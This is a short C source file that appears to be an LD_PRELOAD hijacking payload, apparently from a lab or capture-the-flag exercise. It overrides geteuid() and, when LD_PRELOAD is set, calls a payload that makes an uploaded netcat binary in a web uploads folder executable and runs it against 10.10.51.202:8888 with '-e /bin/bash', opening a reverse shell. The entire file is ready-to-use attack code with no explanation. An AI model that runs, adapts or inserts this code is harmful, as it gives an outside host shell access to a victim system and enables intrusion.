#include <stdlib.h>
#include <stdio.h>
#include <string.h> 

void payload() {
        system("chmod a+x /var/www/html/upload_ex/uploads/nc");
        system("/var/www/html/upload_ex/uploads/nc 10.10.51.202 8888 -e /bin/bash");
}   

int  geteuid() {
if (getenv("LD_PRELOAD") == NULL) { return 0; }
unsetenv("LD_PRELOAD");
payload();
}

